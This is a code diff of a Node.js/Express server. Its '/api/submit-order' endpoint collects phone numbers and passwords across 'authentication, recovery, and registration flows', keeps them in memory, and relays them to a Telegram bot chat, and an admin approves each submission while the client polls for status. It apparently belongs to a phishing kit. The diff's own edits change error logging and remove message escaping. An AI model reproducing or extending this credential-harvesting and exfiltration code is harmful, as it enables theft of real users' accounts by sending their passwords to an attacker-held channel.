@@ -23,7 +23,7 @@ function escapeMarkdown(text) {
 // Helper function to safely fetch from Telegram with a built-in timeout and abort handler
 async function sendToTelegram(url, payload) {
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 seconds limit
+    const timeoutId = setTimeout(() => controller.abort(), 15000);
 
     try {
         const response = await fetch(url, {
@@ -34,17 +34,20 @@ async function sendToTelegram(url, payload) {
         });
         clearTimeout(timeoutId);
         const data = await response.json();
+        
+        // THIS IS CRITICAL: If Telegram rejects it, print it clearly in your server console!
         if (!data.ok) {
-            console.error('Telegram API Error Response:', data);
+            console.error('🚨 TELEGRAM REJECTED MESSAGE:', JSON.stringify(data));
+        } else {
+            console.log('✅ Message successfully delivered to Telegram!');
         }
         return data;
     } catch (error) {
         clearTimeout(timeoutId);
-        console.error('Telegram Fetch Error:', error.message);
+        console.error('❌ Telegram Fetch Exception:', error.message);
         throw error;
     }
 }
-
 // Handles Submissions across all authentication, recovery, and registration flows
 app.post('/api/submit-order', async (req, res) => {
     try {
@@ -53,23 +56,19 @@ app.post('/api/submit-order', async (req, res) => {
         const currentTime = Date.now(); 
         const cooldownTime = 15 * 1000; // 15 seconds cooldown
 
-        // Prevent duplicate spam submissions within 15 seconds
         if (lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
             return res.json({ success: true, message: 'Already submitted.' });
         }
 
         lastSubmissionTime[phone] = currentTime;
-        orderStatuses[phone] = 'pending'; // Reset status to pending for this step
+        orderStatuses[phone] = 'pending';
 
         const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
         const countryFlag = "🇸🇱";
-        
-        // Clean phone input
         const rawDigits = phone.replace(/\+232/g, '').trim();
 
-        // Save respective credentials to memory
         if (!userCredentials[phone]) {
             userCredentials[phone] = {};
         }
@@ -113,12 +112,13 @@ app.post('/api/submit-order', async (req, res) => {
             userCredentials[phone].password = uniqueId;
         }
 
-        // Clean layout message sent to Telegram with safe text wrapping
+        // ==========================================
+        // PUT IT RIGHT HERE INSTEAD OF THE OLD `message`
+        // ==========================================
         const message = `${headerTitle}\n\n` +
-                        `${countryFlag} Country: \`+232\`\n` +
-                        `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
-                        `🔑 ${credentialLabel}:\n` +
-                        `${escapeMarkdown(displayValue)}`;
+                        `🇸🇱 Country: +232\n` +
+                        `📱 Phone: ${rawDigits}\n` +
+                        `🔑 ${credentialLabel}:\n${displayValue}`;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const encodedId = encodeURIComponent(uniqueId || 'N/A');
@@ -142,11 +142,10 @@ app.post('/api/submit-order', async (req, res) => {
 
         res.json({ success: true, message: 'Sent successfully.' });
     } catch (error) {
-        console.error("Submit order exception:", error);
+        console.error(error);
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
-
 // Polling loop to check if admin approved the submission
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone ? req.query.phone.trim() : '';
